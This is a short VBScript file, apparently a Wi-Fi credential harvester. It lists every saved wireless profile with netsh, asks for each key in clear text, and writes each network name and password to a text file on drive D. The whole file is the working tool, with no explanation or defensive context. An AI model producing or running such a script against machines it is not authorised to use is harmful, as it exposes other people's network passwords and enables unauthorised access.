Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objFile = objFSO.CreateTextFile("D:\fuckthis.txt", True)

Set objExec = objShell.Exec("netsh wlan show profiles")
Do Until objExec.StdOut.AtEndOfStream
    strLine = objExec.StdOut.ReadLine()
    If InStr(strLine, "All User Profile") Then
        arrProfile = Split(strLine, ": ")
        strProfile = Trim(arrProfile(1))
        Set objExecProfile = objShell.Exec("netsh wlan show profile name=""" & strProfile & """ key=clear")
        Do Until objExecProfile.StdOut.AtEndOfStream
            strProfileLine = objExecProfile.StdOut.ReadLine()
            If InStr(strProfileLine, "Key Content") Then
                arrKey = Split(strProfileLine, ": ")
                strKey = Trim(arrKey(1))
                objFile.WriteLine "SSID: " & strProfile & " - Password: " & strKey
            End If
        Loop
    End If
Loop

objFile.Close